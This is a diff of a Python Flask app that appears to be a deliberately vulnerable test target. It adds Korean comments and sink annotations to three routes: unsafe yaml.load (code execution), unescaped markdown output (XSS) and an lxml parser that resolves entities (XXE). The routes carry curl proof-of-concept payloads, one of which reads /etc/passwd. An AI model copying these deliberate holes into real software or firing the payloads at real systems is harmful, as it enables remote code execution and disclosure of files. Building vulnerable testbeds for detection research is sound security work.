@@ -96,35 +96,51 @@ def download_file_via_path(file_path):
         return jsonify({"error": str(e)}), 400
 
 # PyYAML == 5.3
-# POC : curl "http://127.0.0.1/yaml?data=%21%21python%2Fobject%2Fapply%3Aos.system%20%5B%22touch%20test_file.txt%22%5D"    
+# POC : curl "http://127.0.0.1/yaml?data=%21%21python%2Fobject%2Fapply%3Aos.system%20%5B%22touch%20test_file.txt%22%5D"
+# sink parsing : vulnerable_yaml / yaml / load      
 @app.route('/yaml', methods=['GET'])
 def vulnerable_yaml():
+    # GET 요청의 'data' 파라미터로 전달된 YAML 데이터를 가져옴
     yaml_data = request.args.get('data')  
     try:
+        # YAML 데이터를 파싱함 (주의: yaml.load는 비신뢰성 입력에 대해 위험할 수 있음)
         data = yaml.load(yaml_data, Loader=yaml.Loader)
+        # 성공적으로 파싱된 데이터를 JSON 형식으로 반환
         return jsonify({"message": "YAML parsed successfully", "content": data})
     except Exception as e:
+        # 에러 발생 시 에러 메시지를 JSON 형식으로 반환
         return jsonify({"error": str(e)}), 400
 
 # markdown == 3.1.1
 # POC : curl "http://127.0.0.1/markdown?content=<script>alert('XSS')</script>"
+# sink parsing : vulnerable_markdown / markdown / markdown
 @app.route('/markdown', methods=['GET'])
 def vulnerable_markdown():
+    # GET 요청의 'content' 파라미터로 전달된 마크다운 형식의 데이터를 가져옴, 기본값은 빈 문자열
     content = request.args.get('content', '')
+    # 전달된 마크다운 데이터를 HTML로 변환
     html_output = markdown.markdown(content)
+    # 변환된 HTML을 그대로 출력
     return Markup(html_output)
 
 # lxml
 # POC : curl "http://127.0.0.1/parse_xml?data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A++%3C%21ELEMENT+root+ANY+%3E%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%0A%3Croot%3E%26xxe%3B%3C%2Froot%3E"
+# parse_xml / lxml /      
 @app.route('/parse_xml', methods=['GET'])
-def parse_xml():
+def vulnerable_xml():
     try:
+        # GET 요청의 'data' 파라미터로 전달된 XML 데이터를 가져옴, 기본값은 빈 문자열
         xml_data = request.args.get('data', '')
+        # XML 파서를 설정: DTD 로딩 및 엔티티 해석을 활성화
         parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
+        # 전달된 XML 데이터를 UTF-8로 인코딩하여 파싱함
         root = etree.fromstring(xml_data.encode('utf-8'), parser)
+        # 파싱된 XML 데이터를 pretty print 형식으로 문자열로 변환함
         root_content = etree.tostring(root, pretty_print=True).decode('utf-8')
+        # 성공 메시지와 함께 XML의 루트 태그 및 내용을 JSON 형식으로 반환
         return jsonify({'message': 'XML parsed successfully', 'root_tag': root.tag, 'content': root_content}), 200
     except Exception as e:
+        # 에러 발생 시 에러 메시지를 JSON 형식으로 반환
         return jsonify({'error': str(e)}), 400
 
 if __name__ == '__main__':
